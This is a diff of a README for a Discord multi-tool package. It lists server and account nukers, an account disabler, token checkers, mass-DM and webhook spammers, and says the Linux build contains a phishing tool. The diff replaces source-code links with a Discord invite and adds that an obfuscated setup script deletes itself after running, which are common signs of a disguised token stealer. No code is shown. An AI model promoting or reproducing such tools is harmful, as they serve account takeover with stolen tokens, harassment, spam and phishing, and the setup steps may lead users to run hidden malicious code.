@@ -25,20 +25,20 @@ Please use this tool responsibly and in compliance with all applicable laws and 
 
 ## Features
 
-- [x] - [Selft Bot](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Turn your discord account into a self bot.
-- [x] - [Server Nuker](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Easily nuke a discord server with a BOT Discord.
-- [x] - [Account Nuker](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Quit the servers, Delete friends, Create servers, change the settings of a user with his Token.
-- [ ] - [Account Disabler](https://github.com/assaultfulgg/account-disabler) - Allows you to disable any discord account with the token of this one
-- [x] - [Token Informations](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Get all the information of a Discord User with his Token.
-- [x] - [Tokens Checker](https://github.com/AstraaDev/Discord-Token-AutoLogin) - Allows you to check the validity of a list of tokens quickly.
+- [x] - [Selft Bot](https://discord.gg/AEkScWVk4u) - Turn your discord account into a self bot.
+- [x] - [Server Nuker](https://discord.gg/AEkScWVk4u) - Easily nuke a discord server with a BOT Discord.
+- [x] - [Account Nuker](https://discord.gg/AEkScWVk4u) - Quit the servers, Delete friends, Create servers, change the settings of a user with his Token.
+- [ ] - [Account Disabler](https://discord.gg/AEkScWVk4u) - Allows you to disable any discord account with the token of this one
+- [x] - [Token Informations](https://discord.gg/AEkScWVk4u) - Get all the information of a Discord User with his Token.
+- [x] - [Tokens Checker](https://discord.gg/AEkScWVk4u) - Allows you to check the validity of a list of tokens quickly.
 - [x] - [Clear DM](https://github.com/Da532/Clear) - Delete all your messages sent to a person in dm automatically.
-- [x] - [HypeSquad House Changer](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Select your HypeSquad House.
-- [x] - [Server Lookup](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Get all the information of a Discord Server with an Invite Link.
-- [x] - [Mass DM](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Allows you to DM all friends of the person by sending them the same message.
-- [x] - [Group SPammer](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Allows you to spam the group creation and add users to it.
-- [x] - [WebHooks Spammer](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Spam the message you want through a WebHooks.
-- [x] - [WebHooks Remover](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Delete any WebHooks link.
-- [x] - [Active dev badge](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Gives you an Active Developer Badge.
+- [x] - [HypeSquad House Changer](https://discord.gg/AEkScWVk4u) - Select your HypeSquad House.
+- [x] - [Server Lookup](https://discord.gg/AEkScWVk4u) - Get all the information of a Discord Server with an Invite Link.
+- [x] - [Mass DM](https://discord.gg/AEkScWVk4u) - Allows you to DM all friends of the person by sending them the same message.
+- [x] - [Group SPammer](https://discord.gg/AEkScWVk4u) - Allows you to spam the group creation and add users to it.
+- [x] - [WebHooks Spammer](https://discord.gg/AEkScWVk4u) - Spam the message you want through a WebHooks.
+- [x] - [WebHooks Remover](https://discord.gg/AEkScWVk4u) - Delete any WebHooks link.
+- [x] - [Active dev badge](https://discord.gg/AEkScWVk4u) - Gives you an Active Developer Badge.
 
 Please be aware that there are two versions available, one for Linux and one for Windows. The Linux version does contain phishing attack tool. However, the Windows version doesn't contain phishing attack tool.
 
@@ -52,9 +52,10 @@ Ensure you have Python version 3.10 or higher installed. If not, download and in
 
 Download the tool and extract it from the zip file.
 
-### Step 3: Run the Setup
+### Step 3: Finish the setup in the panel
 
 Execute `setup.bat`. When prompted, type 'y' to complete the setup process. Please be aware that the setup may take at least 40 seconds due to code obfuscation and the download of the ChromeDriver which will be used with certain features.
+(the finishsetup.py file will delete itself after downloading every module and chromedriver.exe soo there would be less chance to mess up the setup)
 
 ### Step 4: Start the GUI
 
